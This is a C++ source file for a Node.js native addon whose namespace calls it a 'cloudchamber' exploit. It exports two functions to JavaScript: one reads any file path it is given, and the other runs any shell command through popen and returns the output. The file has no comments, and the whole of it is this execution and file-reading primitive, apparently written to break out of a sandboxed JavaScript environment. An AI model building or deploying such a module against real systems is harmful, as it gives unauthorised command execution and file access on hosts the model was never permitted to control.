#include <node.h>
#include <fstream>
#include <string>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <array>

namespace cloudchamber_exploit {

using v8::FunctionCallbackInfo;
using v8::Isolate;
using v8::Local;
using v8::Object;
using v8::String;
using v8::Value;

void ReadFile(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    String::Utf8Value path(isolate, args[0]);
    std::string filePath(*path);
    std::ifstream file(filePath);

    if(!file.is_open()) {
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Error: Access Denied").ToLocalChecked());
        return;
    }
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, content.c_str()).ToLocalChecked());
}

void Execute(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    String::Utf8Value cmd(isolate, args[0]);
    std::string command(*cmd);

    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);

    if (!pipe) {
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Error: popen failed").ToLocalChecked());
        return;
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, result.c_str()).ToLocalChecked());
}

void init(Local<Object> exports) {
    NODE_SET_METHOD(exports, "readFile", ReadFile);
    NODE_SET_METHOD(exports, "execute", Execute);
}

NODE_MODULE(NODE_GYP_MODULE_NAME, init)

}
